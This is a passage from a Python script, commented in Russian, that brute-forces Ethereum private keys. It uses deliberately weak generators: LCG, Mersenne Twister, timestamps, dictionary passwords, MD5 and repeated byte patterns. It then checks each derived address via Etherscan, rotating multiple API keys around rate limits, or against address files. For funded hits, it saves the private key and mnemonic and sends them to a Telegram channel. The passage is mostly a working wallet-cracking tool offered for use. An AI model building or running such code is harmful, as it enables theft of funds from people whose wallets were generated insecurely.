                    data = await resp.json()
                    error_msg = data.get('message', 'Rate limit exceeded').lower()
                except ValueError:
                    error_msg = 'Rate limit exceeded'
                retry_after = resp.headers.get('Retry-After', None)
                logger.warning(f"Лимит или ошибка авторизации Etherscan ключа {key_id}: '{error_msg}', Retry-After: {retry_after}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                    wait_time = time_until_midnight_utc()
                    state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                    print(Fore.YELLOW + f"Дневной лимит Etherscan ключа {key_id} ('{error_msg}'). Отключение до полуночи UTC." + Style.RESET_ALL)
                    logger.debug(f"Etherscan ключ {key_id}: отключён до полуночи UTC: {wait_time} сек")
                else:
                    if retry_after:
                        try:
                            retry_after = int(retry_after)
                            retry_after = max(retry_after, MIN_RETRY_AFTER)
                            state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                            logger.debug(f"Etherscan ключ {key_id} Retry-After: {retry_after} сек")
                        except ValueError:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                    else:
                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                        logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                    print(Fore.YELLOW + f"Временный лимит Etherscan ключа {key_id} ('{error_msg}')." + Style.RESET_ALL)
                return None
            else:
                print(Fore.YELLOW + f"Ошибка Etherscan ключа {key_id} (код: {resp.status})." + Style.RESET_ALL)
                logger.warning(f"Ошибка Etherscan ключа {key_id}: код {resp.status}, ответ: {response_text}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                return None
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        print(Fore.YELLOW + f"Сетевая ошибка Etherscan ключа {key_id}: {e}." + Style.RESET_ALL)
        logger.error(f"Сетевая ошибка Etherscan ключа {key_id}: {e}")
        state['active'] = False
        state['limit_reached_time'] = datetime.datetime.now()
        state['temp_pauses'].append(datetime.datetime.now())
        if check_temp_pauses(key_id):
            return None
        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
        logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
        return None
    
# Проверка баланса через Etherscan
async def get_balance_etherscan(address, session):
    available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id) and API_STATES[key_id]['type'] == 'etherscan']
    logger.debug(f"Доступные Etherscan ключи для баланса: {available_keys}")
    if not available_keys:
        logger.debug("Нет доступных Etherscan ключей для проверки баланса.")
        return None

    for key_id in available_keys:
        state = API_STATES[key_id]
        api_key = state['key']
        try:
            url = f'https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}'
            async with session.get(url, timeout=5) as resp:
                response_text = await resp.text()
                logger.debug(f"Etherscan ключ {key_id} (баланс) код: {resp.status}, ответ: {response_text} для {address}")
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        if data['status'] == '1':
                            balance = int(data['result'])
                            logger.debug(f"Etherscan ключ {key_id}: баланс {balance} wei для {address}")
                            await asyncio.sleep(API_REQUEST_INTERVAL)
                            return Web3.from_wei(balance, 'ether')
                        elif data['status'] == '0' and data['message'] == 'OK':
                            logger.debug(f"Etherscan ключ {key_id}: баланс 0 wei для {address}")
                            return 0
                        else:
                            error_msg = data.get('message', 'Нет сообщения').lower()
                            retry_after = resp.headers.get('Retry-After', None)
                            logger.warning(f"Ошибка Etherscan ключа {key_id} (баланс): '{error_msg}', Retry-After: {retry_after}")
                            state['active'] = False
                            state['limit_reached_time'] = datetime.datetime.now()
                            if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                                wait_time = time_until_midnight_utc()
                                state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                                print(Fore.YELLOW + f"Дневной лимит Etherscan ключа {key_id} (баланс) ('{error_msg}'). Отключение до полуночи UTC." + Style.RESET_ALL)
                                logger.debug(f"Etherscan ключ {key_id}: отключён до полуночи UTC: {wait_time} сек")
                            else:
                                state['temp_pauses'].append(datetime.datetime.now())
                                if check_temp_pauses(key_id):
                                    return None
                                if retry_after:
                                    try:
                                        retry_after = int(retry_after)
                                        retry_after = max(retry_after, MIN_RETRY_AFTER)
                                        state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                        logger.debug(f"Etherscan ключ {key_id} Retry-After (баланс): {retry_after} сек")
                                    except ValueError:
                                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                        logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                                else:
                                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                    logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                                print(Fore.YELLOW + f"Временная ошибка Etherscan ключа {key_id} (баланс) ('{error_msg}')." + Style.RESET_ALL)
                            return None
                    except ValueError as e:
                        logger.error(f"Etherscan ключ {key_id}: некорректный JSON (баланс): {e}, ответ: {response_text}")
                        return None
                elif resp.status in (429, 401):
                    try:
                        data = await resp.json()
                        error_msg = data.get('message', 'Rate limit exceeded').lower()
                    except ValueError:
                        error_msg = 'Rate limit exceeded'
                    retry_after = resp.headers.get('Retry-After', None)
                    logger.warning(f"Лимит или ошибка авторизации Etherscan ключа {key_id} (баланс): '{error_msg}', Retry-After: {retry_after}")
                    state['active'] = False
                    state['limit_reached_time'] = datetime.datetime.now()
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                        wait_time = time_until_midnight_utc()
                        state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                        print(Fore.YELLOW + f"Дневной лимит Etherscan ключа {key_id} (баланс) ('{error_msg}'). Отключение до полуночи UTC." + Style.RESET_ALL)
                        logger.debug(f"Etherscan ключ {key_id}: отключён до полуночи UTC: {wait_time} сек")
                    else:
                        if retry_after:
                            try:
                                retry_after = int(retry_after)
                                retry_after = max(retry_after, MIN_RETRY_AFTER)
                                state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                logger.debug(f"Etherscan ключ {key_id} Retry-After (баланс): {retry_after} сек")
                            except ValueError:
                                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                        else:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                        print(Fore.YELLOW + f"Временный лимит Etherscan ключа {key_id} (баланс) ('{error_msg}')." + Style.RESET_ALL)
                    return None
                else:
                    print(Fore.YELLOW + f"Ошибка Etherscan ключа {key_id} (баланс) (код: {resp.status})." + Style.RESET_ALL)
                    logger.warning(f"Ошибка Etherscan ключа {key_id} (баланс): код {resp.status}, ответ: {response_text}")
                    state['active'] = False
                    state['limit_reached_time'] = datetime.datetime.now()
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                    logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                    return None
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(Fore.YELLOW + f"Сетевая ошибка Etherscan ключа {key_id} (баланс): {e}." + Style.RESET_ALL)
            logger.error(f"Сетевая ошибка Etherscan ключа {key_id} (баланс): {e}")
            state['active'] = False
            state['limit_reached_time'] = datetime.datetime.now()
            state['temp_pauses'].append(datetime.datetime.now())
            if check_temp_pauses(key_id):
                return None
            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
            logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
            return None
    
# Загрузка адресов в память
async def load_addresses_to_memory(file_paths):
    logger.info(f"Начало загрузки файлов {file_paths} в память")
    addresses = set()
    start_time = datetime.datetime.now()
    total_size = 0
    for file_path in file_paths:
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        total_size += file_size
        if file_size > 500:
            print(Fore.YELLOW + f"Файл {file_path} ({file_size:.2f} МБ) довольно большой." + Style.RESET_ALL)
            confirm = input(Fore.YELLOW + "Продолжить загрузку? (y/n): " + Style.RESET_ALL).lower()
            if confirm != 'y':
                print(Fore.RED + f"Загрузка файла {file_path} отменена." + Style.RESET_ALL)
                logger.error(f"Загрузка файла {file_path} отменена пользователем.")
                exit(1)
    
    print(Fore.CYAN + f"Загрузка {len(file_paths)} файла(ов) ({total_size:.2f} МБ)..." + Style.RESET_ALL)
    
    for file_path in file_paths:
        file_size = os.path.getsize(file_path)
        invalid_lines = 0
        lines_processed = 0
        try:
            with tqdm.tqdm(total=file_size, desc=f"Loading {os.path.basename(file_path)}", unit="B", unit_scale=True) as file_progress:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            invalid_lines += 1
                            continue
                        lines_processed += 1
                        addresses.add(line.lower())
                        if lines_processed % 1000 == 0:
                            file_progress.update(sum(len(l.encode('utf-8')) + 1 for l in f.buffer.peek(1000).decode('utf-8', errors='ignore').splitlines()))
        except (FileNotFoundError, PermissionError) as e:
            print(Fore.RED + f"Ошибка при чтении файла {file_path}: {e}" + Style.RESET_ALL)
            logger.error(f"Ошибка при чтении файла {file_path}: {e}")
            exit(1)
        
        if invalid_lines > 0:
            print(Fore.YELLOW + f"Пропущено {invalid_lines} пустых строк в {file_path}." + Style.RESET_ALL)
    
    elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
    print(Fore.GREEN + f"Загружено {len(addresses)} адресов за {elapsed_time:.2f} секунд." + Style.RESET_ALL)
    logger.info(f"Завершена загрузка {len(addresses)} адресов за {elapsed_time:.2f} секунд")
    return addresses

# Загрузка паролей для метода 9
def load_password_dictionary(file_path):
    if not os.path.exists(file_path):
        print(Fore.RED + f"Файл {file_path} не найден." + Style.RESET_ALL)
        logger.error(f"Файл паролей {file_path} не найден.")
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"Загружено {len(passwords)} паролей из {file_path}" + Style.RESET_ALL)
        logger.info(f"Загружено {len(passwords)} паролей из {file_path}")
        return passwords
    except Exception as e:
        print(Fore.RED + f"Ошибка при чтении файла {file_path}: {e}" + Style.RESET_ALL)
        logger.error(f"Ошибка при чтении паролей {file_path}: {e}")
        return []

# Интерфейс пользователя
def choose_vanity_pattern():
    print(Fore.CYAN + "Выберите шаблон для Vanity-адреса:" + Style.RESET_ALL)
    while True:
        prefix = input(Fore.CYAN + "Введите префикс (A-F,0-9, до 4 символов, например, 0xABDC): " + Style.RESET_ALL)
        if re.match(r'^(0x)?[a-fA-F0-9]{0,4}$', prefix):
            if prefix and not prefix.startswith('0x'):
                prefix = '0x' + prefix
            break
        print(Fore.RED + "Ошибка: префикс должен содержать 0-9, a-f, до 4 символов." + Style.RESET_ALL)
    while True:
        suffix = input(Fore.CYAN + "Введите суффикс (A-F,0-9, до 4 символов, например, ABDC): " + Style.RESET_ALL)
        if re.match(r'^[a-fA-F0-9]{0,4}$', suffix):
            break
        print(Fore.RED + "Ошибка: суффикс должен содержать 0-9, a-f, до 4 символов." + Style.RESET_ALL)
    if not prefix and not suffix:
        print(Fore.RED + "Укажите хотя бы префикс или суффикс." + Style.RESET_ALL)
        return choose_vanity_pattern()
    return prefix, suffix

def choose_generation_method():
    while True:
        print(Fore.CYAN + "Выберите метод генерации:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. Стандартная генерация" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Отсутствует (криптографически безопасно)]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует 32 случайных байта с использованием криптографически\n"
                           "   безопасного генератора (os.urandom), после чего хэширует их с помощью\n"
                           "   Keccak-256 для создания приватного ключа. Метод безопасен и соответствует\n"
                           "   стандартам Ethereum." + Style.RESET_ALL)
        print(Fore.CYAN + "2. Брутфорс Vanity-адресов" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Средняя (зависит от длины шаблона)]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует приватные ключи до тех пор, пока соответствующий\n"
                           "   адрес не будет начинаться или заканчиваться заданным шаблоном (префикс\n"
                           "   или суффикс до 4 символов, например, 0xABDC). Подходит для создания\n"
                           "   персонализированных адресов, но требует значительных вычислений для\n"
                           "   длинных шаблонов." + Style.RESET_ALL)
        print(Fore.CYAN + "3. Генерация в пределах группы (A,B,C,D,E,F,G,H)" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Средняя]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Создаёт приватные ключи в заданных числовых диапазонах\n"
                           "   (группы A-H), определённых заранее. Каждая группа представляет интервал\n"
                           "   чисел, из которых выбирается случайное значение, хэшируемое для получения\n"
                           "   ключа. Используется для тестирования или специфических сценариев." + Style.RESET_ALL)
        print(Fore.CYAN + "4. Мнемонические фразы со слабым RNG + генерация из файла" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует мнемоническую фразу (BIP-39) с использованием\n"
                           "   линейного конгруэнтного генератора (LCG) вместо криптографически\n"
                           "   безопасного RNG. LCG имеет низкую энтропию (~32 бита), что делает\n"
                           "   фразу предсказуемой. Фраза преобразуется в seed и затем в ключ\n"
                           "   через Keccak-256. Либо генерация SEED на основании слов в словаре." + Style.RESET_ALL)
        print(Fore.CYAN + "5. Уязвимые комбинированные ключи" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует ключи с предсказуемыми паттернами: повторяющиеся\n"
                           "   символы (например, 0xAA повторяется), полуслучайные последовательности\n"
                           "   (часть байтов случайна, часть фиксирована) или уязвимые паттерны\n"
                           "   (например, 0xDEADBEEF). Хэшируется через Keccak-256." + Style.RESET_ALL)
        print(Fore.CYAN + "6. Ключи на основе времени" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Использует временные метки (timestamp) как входные данные,\n"
                           "   преобразуя их в 32-байтное значение и хэшируя через Keccak-256 для\n"
                           "   создания ключа. Может использовать текущую или заданную дату, что\n"
                           "   делает ключи предсказуемы. Перебирает знаения кратно секунде в\n"
                           "   обратном порядке от заданной даты." + Style.RESET_ALL)
        print(Fore.CYAN + "7. Ключи через Mersenne Twister" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует 32 байта с использованием генератора псевдослучайных\n"
                           "   чисел Mersenne Twister (MT19937), инициализированного временной меткой.\n"
                           "   Полученные байты хэшируются через Keccak-256. MT19937 предсказуем\n"
                           "   при известном seed." + Style.RESET_ALL)
        print(Fore.CYAN + "8. Конкатенация слабых источников" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Комбинирует несколько источников низкой энтропии: временную\n"
                           "   метку (8 байт), идентификатор процесса (4 байта), случайные байты\n"
                           "   (8 байт) и фиксированную константу (12 байт). Результат хэшируется\n"
                           "   через Keccak-256." + Style.RESET_ALL)
        print(Fore.CYAN + "9. Ключи из паролей" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Хэширует пароль (из файла или случайный) через Keccak-256\n"
                           "   для создания приватного ключа. Пароли обычно имеют низкую энтропию,\n"
                           "   особенно если взяты из словаря." + Style.RESET_ALL)
        print(Fore.CYAN + "10. Ключи через устаревшие хэш-функции (MD5)" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует ключ, хэшируя случайный счётчик с помощью MD5\n"
                           "   (16 байт), удваивая результат до 32 байт и хэшируя через Keccak-256.\n"
                           "   MD5 устарел и имеет низкую криптографическую стойкость." + Style.RESET_ALL)
        print(Fore.CYAN + "11. Псевдослучайные последовательности (Xorshift)" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Использует алгоритм Xorshift128+ с seed на основе временной\n"
                           "   метки для генерации 32 байт. Полученные байты хэшируются через\n"
                           "   Keccak-256. Xorshift имеет низкую энтропию и предсказуем\n"
                           "   при известном seed." + Style.RESET_ALL)
        print(Fore.CYAN + "12. Усечённые большие числа" + Style.RESET_ALL)
        print(Fore.RED + "   [Уязвимость: Высокая]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   Описание: Генерирует 64 случайных байта (512 бит), усекает до 32 байт\n"
                           "   (256 бит) и хэширует через Keccak-256. Усечение снижает энтропию,\n"
                           "   особенно если входные данные предсказуемы." + Style.RESET_ALL)
        print(Fore.CYAN + "Для паузы нажмите 'PgDN', для возобновления нажмите 'PgUp'" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "Введите номер метода (1-12): " + Style.RESET_ALL)
        if choice in [str(i) for i in range(1, 13)]:
            return int(choice)
        print(Fore.RED + "Неверный выбор. Попробуйте снова." + Style.RESET_ALL)

async def choose_check_mode():
    while True:
        print(Fore.CYAN + "Выберите режим проверки:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. Только онлайн (проверка через API)" + Style.RESET_ALL)
        print(Fore.CYAN + "2. Онлайн + файл (API и сравнение с файлом)" + Style.RESET_ALL)
        print(Fore.CYAN + "3. Только файл (сравнение с файлом)" + Style.RESET_ALL)
        choice = input(Fore.CYAN + "Введите номер режима (1-3): " + Style.RESET_ALL)
        if choice in ['1', '2', '3']:
            mode = int(choice)
            file_paths = []
            addresses_set = set()
            if mode in [2, 3]:
                while True:
                    paths = input(Fore.CYAN + "Введите пути к *.txt файлам (через запятую): " + Style.RESET_ALL).strip()
                    if not paths:
                        print(Fore.RED + "Укажите хотя бы один файл." + Style.RESET_ALL)
                        continue
                    file_paths = [p.strip() for p in paths.split(',')]
                    valid = True
                    for path in file_paths:
                        if not os.path.exists(path):
                            print(Fore.RED + f"Файл {path} не найден." + Style.RESET_ALL)
                            valid = False
                        elif not path.endswith('.txt'):
                            print(Fore.RED + f"Файл {path} должен быть .txt." + Style.RESET_ALL)
                            valid = False
                    if valid and len(file_paths) <= 5:
                        break
                    elif len(file_paths) > 5:
                        print(Fore.RED + "Максимум 5 файлов." + Style.RESET_ALL)
                addresses_set = await load_addresses_to_memory(file_paths)
            return mode, file_paths, addresses_set
        print(Fore.RED + "Неверный выбор. Попробуйте снова." + Style.RESET_ALL)

def choose_group():
    print(Fore.CYAN + "Выберите группу (A-H):" + Style.RESET_ALL)
    group = input(Fore.CYAN + "Введите букву группы: " + Style.RESET_ALL).upper()
    if group in GROUP_RANGES:
        return group
    print(Fore.RED + "Неверная группа. Попробуйте снова." + Style.RESET_ALL)
    return choose_group()    

# Сохранение результатов
async def save_wallet_results(address, private_key, mnemonic_phrase, method, balance=None, group=None, source="API"):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    wallet_info = f"{address} {private_key} [from {source}]"
    if mnemonic_phrase and method == 9:
        wallet_info += f" [password: {mnemonic_phrase}]"
    elif mnemonic_phrase:
        wallet_info += f" [mnemonic: {mnemonic_phrase}]"
    wallet_info += "\n"
    
    wallet_info_balance = f"{address} {private_key} [from {source}]"
    if mnemonic_phrase and method == 9:
        wallet_info_balance += f" [password: {mnemonic_phrase}]"
    elif mnemonic_phrase:
        wallet_info_balance += f" [mnemonic: {mnemonic_phrase}]"
    wallet_info_balance += f" [Balance: {balance if balance is not None else 'N/A'} ETH]\n"
    
    print(Fore.GREEN + "\nНайден кошелёк!" + Style.RESET_ALL)
    print(Fore.GREEN + f"Адрес: {address}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Приватный ключ: {private_key}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Мнемоническая фраза/Пароль: {mnemonic_phrase if mnemonic_phrase else 'N/A'}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Метод: {method}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Группа: {group if group else 'N/A'}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Баланс: {balance if balance is not None else 'N/A'} ETH" + Style.RESET_ALL)
    print(Fore.GREEN + f"Источник: {source}" + Style.RESET_ALL)
    print(Fore.GREEN + f"Время: {timestamp}" + Style.RESET_ALL)
    
    try:
        async with aiofiles.open(SUCCESS_FILE, 'a', encoding='utf-8') as f:
            await f.write(wallet_info)
        logger.info(f"Кошелёк сохранён в {SUCCESS_FILE}: {address}")
        # Циклическое логирование для successful_wallets.txt
        if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 100 * 1024 * 1024:
            async with aiofiles.open(SUCCESS_FILE, 'r', encoding='utf-8') as f:
                lines = await f.readlines()
            keep_lines = lines[int(len(lines) * 0.5):]  # Сохраняем последние 50% строк
            async with aiofiles.open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
                await f.writelines(keep_lines)
            logger.info(f"Файл {SUCCESS_FILE} обрезан циклически (удалены старые записи)")
            print(Fore.YELLOW + f"Файл {SUCCESS_FILE} обрезан: удалены старые записи." + Style.RESET_ALL)
        
        if balance is not None and balance > 0:
            async with aiofiles.open(BALANCE_FILE, 'a', encoding='utf-8') as f:
                await f.write(wallet_info_balance)
            logger.info(f"Кошелёк с балансом сохранён в {BALANCE_FILE}: {address}, Баланс: {balance} ETH")
            # Циклическое логирование для successful_wallets_balance.txt
            if os.path.exists(BALANCE_FILE) and os.path.getsize(BALANCE_FILE) > 100 * 1024 * 1024:
                async with aiofiles.open(BALANCE_FILE, 'r', encoding='utf-8') as f:
                    lines = await f.readlines()
                keep_lines = lines[int(len(lines) * 0.5):]
                async with aiofiles.open(BALANCE_FILE, 'w', encoding='utf-8') as f:
                    await f.writelines(keep_lines)
                logger.info(f"Файл {BALANCE_FILE} обрезан циклически (удалены старые записи)")
                print(Fore.YELLOW + f"Файл {BALANCE_FILE} обрезан: удалены старые записи." + Style.RESET_ALL)
    except Exception as e:
        logger.error(f"Ошибка при сохранении кошелька {address}: {e}")
        print(Fore.RED + f"Ошибка при сохранении кошелька {address}: {e}" + Style.RESET_ALL)

async def save_bad_wallet(address, private_key, mnemonic_phrase, method, group=None):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    wallet_info = (
        f"[{timestamp}] Address: {address}, Private Key: {private_key}, "
        f"Mnemonic/Password: {mnemonic_phrase if mnemonic_phrase else 'N/A'}, "
        f"Method: {method}, Group: {group if group else 'N/A'}\n"
    )
    try:
        async with aiofiles.open(BAD_FILE, 'a', encoding='utf-8') as f:
            await f.write(wallet_info)
        logger.info(f"Пустой кошелёк сохранён в {BAD_FILE}: {address}")
    except Exception as e:
        logger.error(f"Ошибка при сохранении пустого кошелька {address}: {e}")
        print(Fore.RED + f"Ошибка при сохранении пустого кошелька {address}: {e}" + Style.RESET_ALL)

# Основной цикл генерации
async def generate_keys(method, check_mode, addresses_set, file_paths, session, group=None, prefix=None, suffix=None, vulnerable_type=None, password_file=None, timestamp=None):
    global stats
    passwords = load_password_dictionary(password_file) if password_file else []
    if method in [4, 9] and not passwords:
        print(Fore.RED + f"Файл {'слов' if method == 4 else 'паролей'} пуст или не удалось загрузить. Завершение." + Style.RESET_ALL)
        logger.error(f"Файл {'слов' if method == 4 else 'паролей'} пуст или не удалось загрузить.")
        return

    state = load_state()
    start_index = state['start_index']
    last_password_index = state['last_password_index']
    iteration = start_index
    password_index = last_password_index
    progress_bar = tqdm.tqdm(initial=start_index, desc="Generating keys", unit="keys")

    # Очистка used_keys для методов 4 и 9, чтобы избежать влияния предыдущих запусков
    if method in [4, 9] and passwords:
        async with used_keys_lock:
            used_keys.clear()
        logger.info("Множество used_keys очищено для метода {}".format(method))
        print(Fore.YELLOW + "Множество использованных ключей очищено." + Style.RESET_ALL)

    while True:
        await pause_event.wait()
        if method in [4, 9] and passwords and password_index >= len(passwords):
            print(Fore.YELLOW + "Все пароли из словаря проверены." + Style.RESET_ALL)
            logger.info("Все пароли из словаря проверены.")
            save_state(0, 0)
            print(Fore.GREEN + "Состояние сброшено: start_index=0, last_password_index=0" + Style.RESET_ALL)
            logger.info("Состояние сброшено: start_index=0, last_password_index=0")
            break

        password = passwords[password_index] if passwords and method in [4, 9] else None
        if method == 2:
            private_key, address = generate_vanity_address(prefix, suffix)
            mnemonic_phrase = None
        elif method == 3:
            private_key = generate_private_key_in_group(group)
            address = get_address_from_private_key(private_key)
            mnemonic_phrase = None
        else:
            private_key, mnemonic_phrase = await generate_private_key_by_method(
                method, used_keys, used_keys_lock, vulnerable_type, password, timestamp
            )
            if not private_key:
                print(Fore.RED + "Ошибка генерации ключа." + Style.RESET_ALL)
                logger.error("Не удалось сгенерировать ключ.")
                continue
            address = get_address_from_private_key(private_key)

        if not is_valid_eth_address(address):
            print(Fore.RED + f"Невалидный адрес: {address}" + Style.RESET_ALL)
            logger.error(f"Сгенерирован невалидный адрес: {address}")
            continue

        stats['keys_generated'] += 1
        if method == 3 and group:
            stats['group_stats'][group]['keys'] += 1
        progress_bar.update(1)

        # Вывод информации о сгенерированном ключе
        print(Fore.CYAN + f"\nСгенерирован ключ #{stats['keys_generated']}:" + Style.RESET_ALL)
        print(Fore.CYAN + f"Адрес: {address}" + Style.RESET_ALL)
        print(Fore.CYAN + f"Приватный ключ: {private_key}" + Style.RESET_ALL)
        if mnemonic_phrase:
            print(Fore.CYAN + f"{'Мнемоническая фраза' if method != 9 else 'Пароль'}: {mnemonic_phrase}" + Style.RESET_ALL)

        # Циклическое логирование для eth_generator.log
        if os.path.exists('eth_generator.log') and os.path.getsize('eth_generator.log') > 100 * 1024 * 1024:
            try:
                async with aiofiles.open('eth_generator.log', 'r', encoding='utf-8') as f:
                    lines = await f.readlines()
                keep_lines = lines[int(len(lines) * 0.5):]
                async with aiofiles.open('eth_generator.log', 'wb') as f:
                    await f.write(b'\xEF\xBB\xBF')
                    await f.write(''.join(keep_lines).encode('utf-8'))
                logger.info("Файл eth_generator.log обрезан циклически")
                print(Fore.YELLOW + "Лог-файл обрезан: удалены старые записи." + Style.RESET_ALL)
            except Exception as e:
                logger.error(f"Ошибка при циклической очистке лога: {e}")
                print(Fore.RED + f"Ошибка при обработке лога: {e}" + Style.RESET_ALL)

        match_found = False
        balance = None
        if check_mode in [2, 3]:
            if await compare_address_with_file(address, addresses_set):
                stats['matches_file'] += 1
                if method == 3 and group:
                    stats['group_stats'][group]['matches_file'] += 1
                match_found = True
                message = "Совпадение найдено в файле."
                await send_telegram_message(message, session, method, address, private_key, mnemonic_phrase, balance)
                await save_wallet_results(address, private_key, mnemonic_phrase, method, balance, group, source="file")
                print(Fore.GREEN + "Совпадение найдено в файле!" + Style.RESET_ALL)
            elif check_mode == 3:
                # Сохраняем адреса, не найденные в файле, как пустые в режиме "Только файл"
                await save_bad_wallet(address, private_key, mnemonic_phrase, method, group)
                print(Fore.YELLOW + "Адрес не найден в файле. Сохранён как пустой." + Style.RESET_ALL)
                logger.info(f"Адрес {address} сохранён как пустой в {BAD_FILE} (режим check_mode=3)")

        if check_mode in [1, 2] and not match_found:
            if await check_transactions(address, session):
                stats['matches_api'] += 1
                if method == 3 and group:
                    stats['group_stats'][group]['matches_api'] += 1
                match_found = True
                balance = await get_balance_etherscan(address, session)
                if balance is not None:
                    print(Fore.GREEN + f"Баланс: {balance} ETH" + Style.RESET_ALL)
                    if balance > 0:
                        stats['addresses_with_balance'] += 1
                        message = f"Адрес с балансом: {balance} ETH."
                    else:
                        message = "Найден адрес с транзакциями, но баланс равен 0."
                else:
                    message = "Найден адрес с транзакциями, но баланс не проверен."
                await send_telegram_message(message, session, method, address, private_key, mnemonic_phrase, balance)
                await save_wallet_results(address, private_key, mnemonic_phrase, method, balance, group, source="API")
                print(Fore.GREEN + message + Style.RESET_ALL)
            else:
                # Сохраняем адреса без транзакций как пустые в режимах "Только онлайн" и "Онлайн + файл"
                await save_bad_wallet(address, private_key, mnemonic_phrase, method, group)
                print(Fore.YELLOW + "Адрес без транзакций. Сохранён как пустой." + Style.RESET_ALL)
                logger.info(f"Адрес {address} сохранён как пустой в {BAD_FILE} (режим check_mode={check_mode})")

        iteration += 1
        if passwords and method in [4, 9]:
            password_index += 1
        if iteration % 10 == 0:
            save_state(iteration, password_index)
            await save_stats(method, check_mode, group)

async def main():
    global last_timestamp
    try:
        logger.info("Запуск программы")
        threading.Thread(target=listen_for_pause, daemon=True).start()
